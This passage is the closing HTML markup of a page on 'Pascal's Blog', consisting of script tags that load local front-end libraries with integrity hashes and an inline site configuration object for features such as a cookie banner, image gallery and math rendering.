src=/lib/lazysizes/lazysizes.min.2966e65b518f6d2c2e49602138527a612a93dcad59d702de3836518afd67c60da45ba8a6deecb9f57036440988f44079c4f615502b20698546ad100a826642c1.js integrity="sha512-KWbmW1GPbSwuSWAhOFJ6YSqT3K1Z1wLeODZRiv1nxg2kW6im3uy59XA2RAmI9EB5xPYVUCsgaYVGrRAKgmZCwQ=="></script><script src=/lib/twemoji/twemoji.min.6c24276208463913359c7a512e70acd942789811a0c7557daacb6770d2d0e2f7a31f04c7461f9bf02e13eae0e3b77ee1c5be0bbdbabaefcc99ff324627fa43a9.js integrity="sha512-bCQnYghGORM1nHpRLnCs2UJ4mBGgx1V9qstncNLQ4vejHwTHRh+b8C4T6uDjt37hxb4Lvbq678yZ/zJGJ/pDqQ=="></script><script src=/lib/typeit/typeit.min.f27efa857ac46448d67802135c65454dfc450176698f8fb06912d192dada782d98abfd8fbaf9ad33a15fb7971ed227e86d2082b88c2319260c237f147c9a624b.js integrity="sha512-8n76hXrEZEjWeAITXGVFTfxFAXZpj4+waRLRktraeC2Yq/2PuvmtM6Fft5ce0ifobSCCuIwjGSYMI38UfJpiSw=="></script><script src=/lib/lightgallery/lightgallery.min.19a5670215d212597a09d4971208e95020f2840f36e9d0b00daa18b35496b19b1ca1187a307b6c2efe567e80db1c16f1eb54e5aad208a4e8f2b56d635a96a94a.js integrity="sha512-GaVnAhXSEll6CdSXEgjpUCDyhA826dCwDaoYs1SWsZscoRh6MHtsLv5WfoDbHBbx61TlqtIIpOjytW1jWpapSg=="></script><script src=/lib/lightgallery/lg-thumbnail.min.2e9a05abd3c9e56cdd7ac0b426bd2241a4b735e6e34e1eea29f120f34aa61fd8efe38b7cf351ccf25ce5d2bb8f4d5d5d0d48637ad902c1898f0d8cf553d16d55.js integrity="sha512-LpoFq9PJ5WzdesC0Jr0iQaS3NebjTh7qKfEg80qmH9jv44t881HM8lzl0ruPTV1dDUhjetkCwYmPDYz1U9FtVQ=="></script><script src=/lib/lightgallery/lg-zoom.min.e6b30be1e97da9a2e10c04fe7e270d7296f8ab3ed59ee3104bef02e57d9678c19a5cad77b55f2f8d506ed128f80379dcb9a73c277b970fd3856bea08117a38b9.js integrity="sha512-5rML4el9qaLhDAT+ficNcpb4qz7VnuMQS+8C5X2WeMGaXK13tV8vjVBu0Sj4A3ncuac8J3uXD9OFa+oIEXo4uQ=="></script><script src=/lib/clipboard/clipboard.min.ccafafa8cae1986bfccbb2f650cdbfd99d8ea58d9baddc22b744efe0e9b95c249f2e6d6d160dddcb1d61db4d1135f3ee2691d4273f8d667c0d9666dcaf91e8b4.js integrity="sha512-zK+vqMrhmGv8y7L2UM2/2Z2OpY2brdwit0Tv4Om5XCSfLm1tFg3dyx1h200RNfPuJpHUJz+NZnwNlmbcr5HotA=="></script><script src=/lib/sharer/sharer.min.8a0920eb1227f32329af39f199f24f5429171e1431bbd26ba5d5591605ee8ff7ec57fd12c227378528076337e5c26828e29bcd8b121d15f68aaf6eccea7f44d9.js integrity="sha512-igkg6xIn8yMprznxmfJPVCkXHhQxu9JrpdVZFgXuj/fsV/0Swic3hSgHYzflwmgo4pvNixIdFfaKr27M6n9E2Q=="></script><script src=/lib/katex/katex.min.4c569eb93ddc633083f1769987bb7b7fe7bb01d081dd2b80bd5e2110fc21cacadb1d22b44975215c97efe777e75823169b0dbfb8c1e0c6ecd295cad6fb83d276.js integrity="sha512-TFaeuT3cYzCD8XaZh7t7f+e7AdCB3SuAvV4hEPwhysrbHSK0SXUhXJfv53fnWCMWmw2/uMHgxuzSlcrW+4PSdg=="></script><script src=/lib/katex/auto-render.min.0b3204394b35d5243bb5e90b8447b982297d9038a9e114c96557fba528e5c4e75569860711c41f961ba73f3d90fe89cd0b8b252fd8e92a3bcd8333c00311297b.js integrity="sha512-CzIEOUs11SQ7tekLhEe5gil9kDip4RTJZVf7pSjlxOdVaYYHEcQflhunPz2Q/onNC4slL9jpKjvNgzPAAxEpew=="></script><script src=/lib/katex/copy-tex.min.ebda10949ca337b54b4036a001a68ead47e0a7ae957564e2d19072edaa00ada007f07d82d7760cf8900f4743772815bb1bcda00e7bdc6f497de770ce8b41b2a1.js integrity="sha512-69oQlJyjN7VLQDagAaaOrUfgp66VdWTi0ZBy7aoAraAH8H2C13YM+JAPR0N3KBW7G82gDnvcb0l953DOi0GyoQ=="></script><script src=/lib/katex/mhchem.min.a064453932182c508ce7675b3547a49c3b0aa5e1668ebaaf1d31d1ee648317d928c6bfbd9c0e31019fea775465c92094fc14b91ef1d032dcb45408a466d7ccaa.js integrity="sha512-oGRFOTIYLFCM52dbNUeknDsKpeFmjrqvHTHR7mSDF9koxr+9nA4xAZ/qd1RlySCU/BS5HvHQMty0VAikZtfMqg=="></script><script src=/sw.min.8d81f978108c3bab356ea396a7ac6a692c922109fdffb6b57d3e183429c6edfc139ac6aac51bd1776a21a40325b2d72816f4b2b1656b68009f7cd00ecc975ec9.js integrity="sha512-jYH5eBCMO6s1bqOWp6xqaSySIQn9/7a1fT4YNCnG7fwTmsaqxRvRd2ohpAMlstcoFvSysWVraACffNAOzJdeyQ=="></script><script src=/lib/cookieconsent/cookieconsent.min.c975ea3858dd8c7347d46343fb510ed236efbde6c0069cc6283eba7639d47e22a560c1391c6314247a0269e1380f93d31b662c4897fa770ab2514bd0bd2d2f68.js integrity="sha512-yXXqOFjdjHNH1GND+1EO0jbvvebABpzGKD66djnUfiKlYME5HGMUJHoCaeE4D5PTG2YsSJf6dwqyUUvQvS0vaA=="></script><script>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:-1},comment:{},cookieconsent:{content:{dismiss:"Got it!",link:"Learn more",message:"This website uses Cookies to improve your experience."},enable:!0,palette:{button:{background:"#f0f0f0"},popup:{background:"#1aa3ff"}},theme:"edgeless"},data:{"id-1":"Pascal's Blog","id-2":"Pascal's Blog"},lightGallery:{actualSize:!1,exThumbImage:"data-thumbnail",hideBarsDelay:2e3,selector:".lightgallery",speed:400,thumbContHeight:80,thumbWidth:80,thumbnail:!0},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{highlightTag:"em",maxResultLength:10,noResultsFound:"No results found",snippetLength:30},twemoji:!0,typeit:{cursorChar:"|",cursorSpeed:1e3,data:{"id-1":["id-1"],"id-2":["id-2"]},duration:-1,speed:100}}</script><script src=/js/theme.min.c2a59c0b69da00259a9e6b37afd9726fda4450eba8d01fbec0c6008021b1aafef854080a43d4dd00c60f3d17663879b004f2271605ee89655f62151b4eaab479.js integrity="sha512-wqWcC2naACWanms3r9lyb9pEUOuo0B++wMYAgCGxqv74VAgKQ9TdAMYPPRdmOHmwBPInFgXuiWVfYhUbTqq0eQ=="></script></body></html>